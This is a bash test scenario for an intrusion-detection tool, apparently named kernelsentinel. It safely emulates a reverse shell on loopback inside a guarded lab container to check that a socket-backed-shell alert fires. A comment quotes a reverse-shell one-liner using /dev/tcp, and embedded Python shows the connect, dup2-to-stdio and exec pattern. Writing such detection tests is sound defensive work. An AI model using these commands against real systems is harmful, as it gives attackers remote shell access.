#!/bin/bash
# Scenario: a shell whose stdio is a TCP socket -- the reverse shell.
#   MITRE ATT&CK: T1059.004 (Unix Shell), T1571 (Non-Standard Port)
#   ks-expect: socket_backed_shell
#   ks-run: lab
#
# shell_from_network_daemon catches a shell *descended from a daemon*. It
# structurally cannot catch this one: `bash -i >& /dev/tcp/host/4444 0>&1` run
# from anywhere has no nginx, no apache, nothing recognisable in its ancestry.
# What makes it a reverse shell is not who its parent is -- it is that its
# standard input is a socket. An ordinary shell gets a tty, a pipe or a file.
#
# Deliberately an AF_INET socket over loopback and not a socketpair. Programs
# use AF_UNIX socketpairs for ordinary IPC all day; an interactive shell reading
# commands from a TCP connection is the shape with no innocent explanation.
#
# Contained: the lab runs with --network none, so this is loopback only. Nothing
# leaves the container and no external host is contacted.
#
# One consequence of that containment shows up in the score. Both ends run here,
# so the scenario's own listener trips unexpected_listener, which chains with
# socket_backed_shell and takes the incident to 100. In the wild the attacker's
# machine does the listening and the victim only connects out, so the same
# attack scores 70 (77 in a container). The 100 is the harness, not the
# detection -- do not read it as the real-world severity.
set -euo pipefail
if [[ ! -f /.ks-lab ]] || [[ "${KS_LAB:-}" != "1" ]]; then
	echo "refusing to run outside the kernelsentinel lab container" >&2
	exit 90
fi
command -v python3 >/dev/null || { echo "python3 required in the lab image" >&2; exit 90; }

# One process does both ends. listen() happens before the fork, so the child's
# connect() is guaranteed to land in the backlog -- no port to pick, no
# readiness probe, no race.
#
# The first version polled the listener by connecting to it, which consumed the
# single pending connection and left the real one refused. A readiness check
# that changes what it checks is worse than none.
python3 - <<'ENDPY'
import os, socket, sys

srv = socket.socket()
srv.bind(("127.0.0.1", 0))
srv.listen(1)
port = srv.getsockname()[1]

pid = os.fork()
if pid == 0:
    # The victim end: connect, put the socket on fd 0/1/2, exec. This is
    # what every reverse shell one-liner does, written so the exec is
    # deterministic rather than depending on bash's /dev/tcp support.
    srv.close()
    s = socket.create_connection(("127.0.0.1", port))
    for fd in (0, 1, 2):
        os.dup2(s.fileno(), fd)
    os.execv("/bin/sh", ["/bin/sh", "-c", "id"])

# The other end: accept, drain, wait.
conn, _ = srv.accept()
conn.settimeout(5)
try:
    conn.recv(4096)
except OSError:
    pass
conn.close()
srv.close()
_, status = os.waitpid(pid, 0)
sys.exit(0 if os.WIFEXITED(status) else 1)
ENDPY

echo "[scenario] reverse_shell_stdio: exec'd /bin/sh with stdio on a TCP socket"
